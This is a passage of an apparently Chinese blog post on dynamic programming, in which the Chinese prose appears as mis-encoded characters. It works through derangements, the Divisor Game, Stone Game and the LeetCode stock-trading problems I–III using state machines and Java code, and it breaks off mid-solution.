çš„ä¿¡åï¼Œå®ƒä»¬çš„ä¿¡å’Œä¿¡å°åœ¨æ­£ç¡®çš„ä½ç½®ï¼Œä½†æ˜¯å…¶ä½™ i-2 å°ä¿¡æœ‰ dp[i-2] ç§é”™è¯¯è£…ä¿¡çš„æ–¹å¼ã€‚ç”±äº j æœ‰ i-1 ç§å–å€¼ï¼Œå› æ­¤å…±æœ‰ (i-1)*dp[i-2] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚</li><li>i !&#x3D; kï¼Œäº¤æ¢ i å’Œ j çš„ä¿¡åï¼Œç¬¬ i ä¸ªä¿¡å’Œä¿¡å°åœ¨æ­£ç¡®çš„ä½ç½®ï¼Œå…¶ä½™ i-1 å°ä¿¡æœ‰ dp[i-1] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚ç”±äº j æœ‰ i-1 ç§å–å€¼ï¼Œå› æ­¤å…±æœ‰ (i-1)*dp[i-1] ç§é”™è¯¯è£…ä¿¡æ–¹å¼ã€‚</li></ul><p>ç»¼ä¸Šæ‰€è¿°ï¼Œé”™è¯¯è£…ä¿¡æ•°é‡æ–¹å¼æ•°é‡ä¸ºï¼š</p><p>â€‹                              <img src="/2020/03/25/dp/image-20200327142057967.png"> </p><h2><span id="5-æ¯ç‰›ç”Ÿäº§">5. æ¯ç‰›ç”Ÿäº§ âˆš</span></h2><p>é¢˜ç›®æè¿°ï¼šå‡è®¾å†œåœºä¸­æˆç†Ÿçš„æ¯ç‰›æ¯å¹´éƒ½ä¼šç”Ÿ 1 å¤´å°æ¯ç‰›ï¼Œå¹¶ä¸”æ°¸è¿œä¸ä¼šæ­»ã€‚ç¬¬ä¸€å¹´æœ‰ 1 åªå°æ¯ç‰›ï¼Œä»ç¬¬äºŒå¹´å¼€å§‹ï¼Œæ¯ç‰›å¼€å§‹ç”Ÿå°æ¯ç‰›ã€‚æ¯åªå°æ¯ç‰› 3 å¹´ä¹‹åæˆç†Ÿåˆå¯ä»¥ç”Ÿå°æ¯ç‰›ã€‚ç»™å®šæ•´æ•° Nï¼Œæ±‚ N å¹´åç‰›çš„æ•°é‡ã€‚</p><p>ç¬¬ i å¹´æˆç†Ÿçš„ç‰›çš„æ•°é‡ä¸ºï¼š                               </p><p><img src="/2020/03/25/dp/image-20200327144441491.png"></p><h1><span id="å„ç§gameé›†åˆ">å„ç§Gameé›†åˆ</span></h1><h2><span id="1025-divisor-game">1025. Divisor Game Ã—</span></h2><p>Alice and Bob take turns playing a game, with Alice starting first.</p><p>Initially, there is a number <code>N</code> on the chalkboard. On each playerâ€™s turn, that player makes a <em>move</em> consisting of:</p><ul><li>Choosing any <code>x</code> with <code>0 &lt; x &lt; N</code> and <code>N % x == 0</code>.</li><li>Replacing the number <code>N</code> on the chalkboard with <code>N - x</code>.</li></ul><p>Also, if a player cannot make a move, they lose the game.</p><p>Return <code>True</code> if and only if Alice wins the game, assuming both players play optimally.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Alice chooses 1, and Bob has no more moves.</span><br></pre></td></tr></table></figure><p><strong>Example 2:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Alice chooses 1, Bob chooses 1, and Alice has no more moves.</span><br></pre></td></tr></table></figure><p>Gameç±»é—®é¢˜éƒ½æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯æ— è®ºAè¿˜æ˜¯Bç©ï¼Œéƒ½æ˜¯åœ¨åŒæ ·ä¸€ä¸ªè§„åˆ™ä¸‹åšæ¸¸æˆï¼ŒAæˆ–è€…Béƒ½ä¸ä¼šå¯¹ç»“æœæ”¹å˜ã€‚</p><p> å…¶å®å°±æ˜¯DPé—®é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">divisorGame</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> dp[] = <span class="keyword">new</span> <span class="title class_">boolean</span>[N+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i&lt;= N; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span><span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%j==<span class="number">0</span>&amp;&amp;dp[i-j]==<span class="literal">false</span>)</span><br><span class="line">                dp[i]=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•°å­¦è¯æ˜æ³•:</p><p>Prove it by two steps:</p><ol><li>if Alice will lose for N, then Alice will must win for N+1,     since Alice can first just make N decrease 1.</li><li>for any odd number N, it only has odd factor, so after the     first move, it will be an even number</li></ol><p>letâ€™s check the inference<br> fisrt N &#x3D; 1, Alice lose. then Alice will must win for 2.<br> if N &#x3D; 3, since all even number(2) smaller than 3 will leads Alice win, so Alice will lose for 3<br> 3 lose -&gt; 4 win<br> all even number(2,4) smaller than 5 will leads Alice win, so Alice will lose for 5<br> â€¦</p><p>Therefore, Alice will always win for even number, lose for odd number.</p><h2><span id="877-stone-game">877. Stone Game</span></h2><p>Alex and Lee play a game with piles of stones. There are an even number of piles <strong>arranged in a row</strong>, and each pile has a positive integer number of stones <code>piles[i]</code>.</p><p>The objective of the game is to end with the most stones. The total number of stones is odd, so there are no ties.</p><p>Alex and Lee take turns, with Alex starting first. Each turn, a player takes the entire pile of stones from either the beginning or the end of the row. This continues until there are no more piles left, at which point the person with the most stones wins.</p><p>Assuming Alex and Lee play optimally, return <code>True</code> if and only if Alex wins the game.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: [5,3,4,5]</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">Alex starts first, and can only take the first 5 or the last 5.</span><br><span class="line">Say he takes the first 5, so that the row becomes [3, 4, 5].</span><br><span class="line">If Lee takes 3, then the board is [4, 5], and Alex takes 5 to win with 10 points.</span><br><span class="line">If Lee takes the last 5, then the board is [3, 4], and Alex takes 4 to win with 9 points.</span><br><span class="line">This demonstrated that taking the first 5 was a winning move for Alex, so we return true.</span><br></pre></td></tr></table></figure><h1><span id="è‚¡ç¥¨é—®é¢˜çŠ¶æ€æœº">è‚¡ç¥¨é—®é¢˜ï¼ˆçŠ¶æ€æœºï¼‰</span></h1><p>å…ˆè®²ä¸€ä¸‹çŠ¶æ€æœºï¼š</p><p><img src="/2020/03/25/dp/clip_image001.jpg"></p><p>ç±»ä¼¼äºè¿™æ ·çš„å›¾å°±å«åšçŠ¶æ€æœºï¼ŒçŠ¶æ€åªèƒ½ä¸ºçŠ¶æ€0ï¼ŒçŠ¶æ€1å’ŒçŠ¶æ€2.</p><p>è€Œä¸”å®ƒä»¬ä¹‹é—´æ˜¯å¯ä»¥äº’ç›¸è½¬æ¢çš„ï¼Œä¸”æœ‰ä¸€å®šçš„æ¡ä»¶å‘ç”Ÿè½¬æ¢ã€‚</p><p>ä¾‹å¦‚å›¾ä¸€ï¼š</p><p>çŠ¶æ€0å¯ä»¥ä¿æŒçŠ¶æ€0ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¶ˆæŠ–è¿›å…¥çŠ¶æ€1.</p><p>çŠ¶æ€1å¯ä»¥é€šè¿‡ç¡®è®¤å˜ä¸ºçŠ¶æ€2æˆ–è€…é€šè¿‡å¹²æ‰°å˜æˆçŠ¶æ€0.</p><p>ä¹‹å‰ä¹Ÿå­¦è¿‡çŠ¶æ€æœºã€‚è¿™åªæ˜¯ä¸ªä¾‹å­ï¼Œè®©ä½ å¯ä»¥å¯¹çŠ¶æ€æœºæœ‰ä¸€ä¸ªå¤§ä½“çš„ç†è§£ï¼Œå®é™…ä¸Šæ ¹æ®ä¸åŒçš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”»å‡ºä¸åŒçš„çŠ¶æ€æœºã€‚ </p><p>çŠ¶æ€æœºå¯ä»¥å¾ˆç®€å•çš„è§£å†³ä¸€ç³»åˆ—çš„hardé—®é¢˜ã€‚</p><p>å¯ä»¥å…ˆçœ‹çœ‹æˆ‘å†™çš„ã€Šæœ€å¤§å­åºåˆ—ã€‹</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ç§ç‹¬ç‰¹çš„æ–¹æ³•å†æ¥çœ‹å¾…è¿™é“é¢˜ã€‚</p><p>çœ‹è‚¡ç¥¨é—®é¢˜å‰å…ˆçœ‹å®ŒèƒŒåŒ…é—®é¢˜ã€‚</p><h2><span id="leetcode-121-best-time-to-buy-and-sell-stock">Leetcode 121 Best Time to Buy and Sell Stock âˆš</span></h2><p> ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æ°å¥½ä¸€æ¬¡äº¤æ˜“</strong>ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚</p><p>æ ·ä¾‹ï¼š</p><p>è¾“å…¥ï¼š[7, 1, 5, 3, 6, 4]</p><p>è¾“å‡ºï¼š5</p><p>è¾“å…¥ï¼š[7, 6, 4, 3, 1]</p><p>è¾“å‡ºï¼š0</p><p>æ­£å¸¸è§£æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span>(prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> prices[<span class="number">0</span>];</span><br><span class="line">   <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;prices.length;i++)&#123;</span><br><span class="line">     min = prices[i]&lt;min?prices[i]:min;</span><br><span class="line">     res = Math.*max*(prices[i]-min,res);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å£°æ˜ï¼š</p><p>å®šä¹‰sellè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œå–ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰buyè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œä¹°ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>æˆ‘ä»¬å¯ä»¥ç”»å‡ºçŠ¶æ€æœºï¼šï¼ˆç”»çš„æœ‰ç‚¹å·®ï¼‰</p><p><img src="/2020/03/25/dp/clip_image002-1585294076856.png"></p><p>å°±æ˜¯è¯´å®ƒæœ‰ä¸¤ä¸ªçŠ¶æ€ï¼Œä¸€ä¸ªæ˜¯BUYï¼Œä¸€ä¸ªæ˜¯SELLã€‚</p><p>ä¹°å…¥å¿…é¡»åœ¨å–å‡ºä¹‹å‰ï¼Œä¸”å–å‡ºå¿…é¡»ä¾èµ–äºä¸Šä¸€ä¸ªä¹°å…¥çš„å€¼ã€‚</p><p><strong>BUYå¯ä»¥ä¿å­˜BUYçš„çŠ¶æ€æˆ–è€…é€šè¿‡ä¹°å…¥è¿›å…¥SELLçŠ¶æ€ã€‚</strong></p><p><strong>SELLå¯ä»¥ä¿å­˜SELLçš„çŠ¶æ€æˆ–è€…é€šè¿‡å–å‡ºé€€å‡ºçŠ¶æ€ã€‚</strong></p><p>å–å®Œåå°±ç»“æŸäº†ã€‚</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥å†™å‡ºé€’æ¨å¼ï¼š</p><p>Buy &#x3D; max(Buy,0-price[i]);</p><p>Sell&#x3D;max(Sell,Buy+price[i]);</p><p>ç„¶åæˆ‘ä»¬éå†ä¸€épirceæ•°ç»„ï¼Œç”±äºæˆ‘ä»¬åœ¨ä¸€ä¸ªå¾ªç¯é‡Œé¢åŒæ—¶åšbuyå’Œsellã€‚å› æ­¤ä¸ä¼šå‘ç”Ÿsellåœ¨buyä¹‹å‰ã€‚</p><p>åˆç”±äºsellä¾èµ–äºä¸Šæ¬¡buyçš„å€¼ï¼Œè€Œä¸æ˜¯buyæ›´æ–°åçš„å€¼ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿›å…¥å¾ªç¯å‰å…ˆåˆå§‹åŒ–buyä¸º-price[0]; sellä¸º0ï¼ˆå› ä¸ºæ”¶ç›Šæœ€å°‘ä¸º0ï¼‰ï¼Œåœ¨å¾ªç¯ä¸­å…ˆsellç„¶åå†buyã€‚Sellå¤„ç†åˆå§‹åŒ–buyçš„å€¼ï¼Œç„¶åbuyæ›´æ–°buyçš„å€¼ã€‚</p><p>å¦‚æœè¦å…ˆæ‰§è¡Œbuyå†æ‰§è¡Œsellä¹Ÿå¯ä»¥ã€‚å‰ææ˜¯å¾—ç”¨ä¸€ä¸ªå˜é‡å…ˆä¿å­˜å½“å‰buyçš„å€¼ã€‚</p><table><thead><tr><th></th><th><strong>1</strong></th><th><strong>2</strong></th><th><strong>3</strong></th><th><strong>4</strong></th><th><strong>5</strong></th></tr></thead><tbody><tr><td><strong>Sell</strong></td><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td></tr><tr><td><strong>Buy</strong></td><td>-1</td><td>-1</td><td>-1</td><td>-1</td><td>-1</td></tr><tr><td><strong>Statue</strong></td><td>buy</td><td></td><td></td><td></td><td>sell</td></tr></tbody></table> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">stateMachine</span><span class="params">(<span class="type">int</span>[] prices)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">     sell=Math.*max*(sell, buy+prices[i]);</span><br><span class="line">     buy=Math.*max*(buy, <span class="number">0</span>-prices[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> sell;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨tmpä¿å­˜ä¸Šæ¬¡buyçš„å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">stateMachine1</span><span class="params">(<span class="type">int</span>[] prices)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> buy=-prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">     <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> buy;</span><br><span class="line">     buy=Math.*max*(buy, -prices[i]);</span><br><span class="line">     sell=Math.*max*(sell, tmp+prices[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> sell;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶å…¶å®ä¸ç”¨tmpä¿å­˜ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå°±ç›¸å½“äºåˆå§‹åŒ–ä¸ºprice[0]æˆ–è€…price[1]çš„æœ€å°å€¼ï¼Œä¹Ÿå°±æ˜¯-price[0]æˆ–è€…-price[1]çš„æœ€å¤§å€¼ã€‚</p><h2><span id="leetcode-122-best-time-to-buy-and-sell-stock-ii">Leetcode 122 Best Time to Buy and Sell Stock II âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æ— æ•°æ¬¡äº¤æ˜“</strong>ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚</p><p>è¾“å…¥ï¼š[7, 1, 5, 3, 6, 4]</p><p>è¾“å‡ºï¼š7</p><p>è¾“å…¥ï¼š[1, 2, 3, 4, 5]</p><p>è¾“å‡ºï¼š4</p><p>æ­£å¸¸è§£æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit1</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, buy, sell, profit = <span class="number">0</span>, N = prices.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; N) &#123;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; N &amp;&amp; prices[i + <span class="number">1</span>] &lt;= prices[i]) i++;</span><br><span class="line">        buy = prices[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; N &amp;&amp; prices[i + <span class="number">1</span>] &gt; prices[i]) i++;</span><br><span class="line">        sell = prices[i];</span><br><span class="line"></span><br><span class="line">        profit += sell - buy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> profit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥ï¼šä¸‹å®šä¹‰</p><p>å®šä¹‰sellè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œå–ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰buyè¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œä¹°ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>ç¬¬äºŒæ­¥ï¼šç”»çŠ¶æ€æœº</p><p> <img src="/2020/03/25/dp/image-20200327154233734.png"></p><p>ç¬¬ä¸‰æ­¥ï¼šå†™é€’æ¨å¼</p><p>BUY &#x3D; max(BUY,SELL-PRICE[I]);</p><p>SELL &#x3D; max(SELL,BUY+PRICE[I]);</p><table><thead><tr><th></th><th><strong>7</strong></th><th><strong>1</strong></th><th><strong>5</strong></th><th><strong>3</strong></th><th><strong>6</strong></th><th><strong>4</strong></th></tr></thead><tbody><tr><td><strong>Sell</strong></td><td>0</td><td>0</td><td>4</td><td>4</td><td>7</td><td>7</td></tr><tr><td><strong>buy</strong></td><td>-7</td><td>-1</td><td>-1</td><td>1</td><td>1</td><td>3</td></tr><tr><td><strong>statue</strong></td><td></td><td>Buy</td><td>Sell</td><td>Buy</td><td>Sell</td><td>buy</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼š</p><ol><li><p>å› ä¸ºéƒ½æ˜¯å–æœ€å¤§å€¼maxï¼Œæ‰€ä»¥buyå’Œselléƒ½æ˜¯ä¸Šå‡çš„</p></li><li><p>Buyä¾èµ–äºä¸Šä¸€ä¸ªsellï¼Œsellä¾èµ–äºä¸Šä¸€ä¸ªbuy</p></li></ol><p>ç¬¬å››æ­¥ï¼šå†™ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">buy</span> <span class="operator">=</span> -prices[<span class="number">0</span>],sell=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> sell;</span><br><span class="line">           sell=Math.max(sell,prices[i]+buy);</span><br><span class="line">           buy=Math.max(buy,tmp-prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…ˆå–å†ä¹°è¿˜æ˜¯å› ä¸ºæˆ‘ä»¬å·²ç»åˆå§‹åŒ–äº†buyäº†ï¼Œé»˜è®¤è®©å®ƒé€‰æ‹©ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå› æ­¤å¯ä»¥é€‰æ‹©å–æˆ–è€…ä¸å˜ã€‚</p><h2><span id="leetcode-123-best-time-to-buy-and-sell-stock-iii">Leetcode 123 Best Time to Buy and Sell Stock III âˆš</span></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„pricesï¼Œprices[i]è¡¨ç¤ºè‚¡ç¥¨åœ¨ç¬¬iå¤©çš„ä»·æ ¼ï¼ˆä¹°å…¥orå–å‡ºï¼‰ï¼Œåœ¨å–å‡ºè‚¡ç¥¨ä¹‹å‰å¿…é¡»å…ˆä¹°è¿›ï¼Œä¸”æ‰‹ä¸­ä¸èƒ½åŒæ—¶ä¹°è¿›ä¸¤ä»½è‚¡ç¥¨ï¼Œç°åœ¨å…è®¸åš<strong>æœ€å¤šä¸¤æ¬¡äº¤æ˜“</strong>ï¼Œæ±‚æœ€å¤§æ”¶ç›Šã€‚ </p><p>è¾“å…¥ï¼š[3,3,5,0,0,3,1,4]</p><p>è¾“å‡ºï¼š6 </p><p>è¾“å…¥ï¼š[1, 2, 3, 4, 5]</p><p>è¾“å‡ºï¼š4 </p><p>OK</p><p>è¿˜æ˜¯å››æ­¥èµ°ï¼</p><p>è‡ªå·±è¯•è¯•çœ‹ï¼Œå…¶å®ç”»å‡ºçŠ¶æ€å›¾å°±è¡Œäº†ã€‚</p><p>Step1:</p><p>å®šä¹‰sell0è¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œç¬¬ä¸€æ¬¡å–ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰buy0è¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œç¬¬ä¸€æ¬¡ä¹°ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰sell1è¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œç¬¬äºŒæ¬¡å–ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>å®šä¹‰buy1è¡¨ç¤ºæˆªæ­¢åˆ°å½“å¤©ï¼Œç¬¬äºŒæ¬¡ä¹°ä¹‹åèƒ½å¾—åˆ°çš„æœ€å¤§æ”¶ç›Š</p><p>Step2:</p><p> <img src="/2020/03/25/dp/image-20200327154943779.png"></p><p>Step3:</p><p>æ³¨æ„å¦‚ä½•åˆå§‹åŒ–ï¼ï¼</p><p>BUY2å®šä¹‰ä¸ºå¤šå°‘ï¼Ÿ</p><p>é¦–å…ˆBUY2çš„å€¼å¿…é¡»ç­‰äºsell1-price[i]å§ï¼Œæ‰€ä»¥buy2å°±å¿…é¡»åˆå§‹åŒ–ä¸ºæœ€å°å€¼</p><p>Integer.<em>MIN_VALUE</em></p><p>é‚£Sell2å‘¢ï¼Ÿä¹Ÿæ˜¯0</p><p>å› æ­¤ï¼š</p><p>SELL1&#x3D;MAX(SELL1,BUY1+PRICE[I]);</p><p>BUY1&#x3D;MAX(BUY1, 0-PRICE[I]);</p><p>SELL2&#x3D;MAX(SELL2,BUY2+PRICE[I]);</p><p>BUY2&#x3D;MAX(BUY2,SELL1-PRICE[I]);</p><p>è¿™é‡Œæœ‰ä»€ä¹ˆé—®é¢˜å—ï¼Ÿ</p><p>å°½ç®¡æˆ‘ä»¬åœ¨è¿™é‡Œåˆ©ç”¨é¢ å€’buyå’Œsellçš„é¡ºåºæ¥åšï¼ˆä¸ºä»€ä¹ˆé¢ å€’å¯ä»¥é¿å…æ›´æ–°ï¼Ÿå› ä¸ºæˆ‘ä»¬åˆå§‹åŒ–äº†buyå’Œsellï¼Œå¦‚æœä¸åˆå§‹åŒ–buy1çš„è¯æˆ‘ä»¬è¦æ­£åºï¼Œä½†æ˜¯æ­£åºå°±éœ€è¦æ›´å¤šçš„tmpæ¥ä¿å­˜çŠ¶æ€äº†ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½ç†è§£ï¼‰ã€‚BUY2ä¾èµ–äºä¸Šä¸ªSELL1çš„å€¼ï¼Œä½†æ˜¯åœ¨BUY2æ›´æ–°ä¹‹å‰SELL1å°±å·²ç»æ›´æ–°äº†ï¼Œå› æ­¤éœ€è¦ä¿å­˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(prices==<span class="literal">null</span>||prices.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> buy1= -prices[<span class="number">0</span>],sell1=<span class="number">0</span>,buy2=Integer.MIN_VALUE,sell2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> sell1;</span><br><span class="line">        sell1 = Math.max(sell1, buy1+prices[i]);</span><br><span class="line">        buy1 = Math.max(buy1, <span class="number">0</span>-prices[i]);</span><br><span class="line"></span><br><span class="line">        sell2 = Math.max(sell2, buy2+prices[i]);</span><br><span class="line">        buy2 =  Math.max(buy2, 